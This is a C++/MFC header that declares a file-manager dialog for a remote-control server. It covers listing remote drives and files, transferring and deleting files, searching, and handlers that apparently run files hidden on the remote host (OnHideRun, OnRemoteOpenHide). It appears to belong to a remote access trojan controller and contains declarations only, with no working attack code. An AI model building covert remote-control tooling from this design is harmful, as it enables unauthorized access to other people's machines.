#pragma once
typedef CList<CString, CString&> strList;

// CFileManagerDlg 对话框

class CFileManagerDlg : public CDialogEx
{
	DECLARE_DYNAMIC(CFileManagerDlg)

public:
	CFileManagerDlg(CWnd* pParent = NULL, CHpTcpServer* pIOCPServer = NULL, ClientContext *pContext = NULL);
	virtual ~CFileManagerDlg();
	void OnReceiveComplete();
	int initView();

	void GetRemoteFileList(CString directory = "");					//获取文件列表
	CString GetParentDirectory(CString strPath);					//获取父目录
	void FixedRemoteDriveList();									//显示驱动器
	void FixedRemoteFileList(BYTE* pbBuffer, DWORD dwBufferLen);	//显示文件列表
	BOOL MyShell_GetImageLists();
	int	GetIconIndex(LPCTSTR lpFileName, DWORD dwFileAttributes);	//获取图标
	void EnableControl(BOOL bEnable);

	void OnRemoteCopy();					//下载
	void OnRemoteDelete();					//删除
	BOOL SendDeleteJob();					//发送删除任务
	BOOL SendUploadJob();					//上传任务
	void SearchEnd();						//搜索完成

	void FixedRemoteSearchFileList(BYTE* pbBuffer, DWORD dwBufferLen);
	void EndLocalUploadFile();
	void SendFileData();
	void SendTransferMode();				//设置文件长传模式
	CString  GetDirectoryPath(BOOL bIncludeF);			//选择路径
	BOOL SendDownloadJob();							//下载任务发送
	void CreateLocalRecvFile();						//创建本地文件用于保存
	bool MakeSureDirectoryPathExists(LPCTSTR pszDirPath);			//创建嵌套目录
	void SendStop(BOOL bIsDownload);
	void ShowProgress();							//进去条更新
	void EndLocalRecvFile();					//传输完成
	void WriteLocalRecvFile();		//保存文件数据
	void EndRemoteDeleteFile();			//删除完毕
	bool FixedUploadDirectory(LPCTSTR lpPathName);

	CString				strLpath;
	strList				m_Remote_Download_Job;
	strList				m_Remote_Upload_Job;
	strList				m_Remote_Delete_Job;
	CString				m_strOperatingFile; // 文件名
	CString				m_strFileName; // 操作文件名
	CString				m_strReceiveLocalFile;
	CString				m_strUploadRemoteFile;
	CString				m_hCopyDestFolder;
	bool				m_bIsUpload; // 是否是把本地主机传到远程上，标志方向位

	CString				strShowText; // 状态栏要显示的文字

	//CListCtrl*			m_pDragList;		//Which ListCtrl we are dragging FROM
	//CListCtrl*			m_pDropList;		//Which ListCtrl we are dropping ON
	//BOOL		m_bDragging;	//T during a drag operation
	//int			m_nDragIndex;	//Index of selected item in the List we are dragging FROM
	//int			m_nDropIndex;	//Index at which to drop item in the List we are dropping ON
	//CWnd* m_pDropWnd;		//Pointer to window we are dropping on (will be cast to CListCtrl* type)


	void SortColumn1(int iCol, bool bAsc);
	void SortColumn2(int iCol, bool bAsc);
	void SortColumn3(int iCol, bool bAsc);
	void SortColumn4(int iCol, bool bAsc);
	int             m_nSortedCol1;
	bool            m_bAscending1;
	int             m_nSortedCol2;
	bool            m_bAscending2;
	int             m_nSortedCol3;
	bool            m_bAscending3;
	int             m_nSortedCol4;
	bool            m_bAscending4;


	CXTPStatusBar				m_wndStatusBar;
	CXTPProgressCtrl*			m_ProgressCtrl;

	CString					m_Remote_Path;
	__int64					m_nCounter;// 计数器
	bool					id_search_result;
	CImageList				I_ImageList0;
	CImageList				I_ImageList1;

	__int64					m_nOperatingFileLength; // 文件总大小


	HICON m_hIcon;						//图标
	BOOL m_bOnClose;					//是否关闭
	CHpTcpServer* m_iocpServer;
	ClientContext* m_pContext;

	bool m_bIsStop;
	CString m_strDesktopPath;					//桌面路径
	CString m_strStartupPath;					//启动路径
	BYTE m_bRemoteDriveList[1024];				//远程驱动列表

	HANDLE m_hFileSend;							//发送
	HANDLE m_hFileRecv;							//接收
	int m_nTransferMode;						//传输方式
	CString m_Local_Path;


// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_FILE_DLG };
#endif

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

	DECLARE_MESSAGE_MAP()
public:
	afx_msg LRESULT OnShowMessage(WPARAM wParam, LPARAM lParam); // 自定义消息
	afx_msg void OnClose();
	virtual BOOL OnInitDialog();
	virtual void PostNcDestroy();
	CComboBox m_Remote_Directory_ComboBox;
	CListCtrl m_list_remote;
	CListCtrl m_list_remote_search;
	BOOL m_bSubFordle;
	CString m_SearchStr;
	CButton m_BtnSearch;
	CButton m_s;
	CButton m_w;
	afx_msg void OnNMDblclkListRemote(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnCbnSetfocusRemotePath();
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	afx_msg void OnNMRClickListRemote(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnRefresh();
	afx_msg void OnRemoteOpenHide();
	afx_msg void OnTransferR();
	afx_msg void OnDelete();
	afx_msg void OnRename();
	afx_msg void OnNewfolder();
	afx_msg void OnTransferS();
	virtual BOOL OnNotify(WPARAM wParam, LPARAM lParam, LRESULT* pResult);
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg HCURSOR OnQueryDragIcon();
	afx_msg void OnBnClickedButton1();
	afx_msg void OnBnClickedButton2();
	afx_msg void OnBnClickedButton3();
	afx_msg void OnNMRClickListSearch(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnHideRun();
};
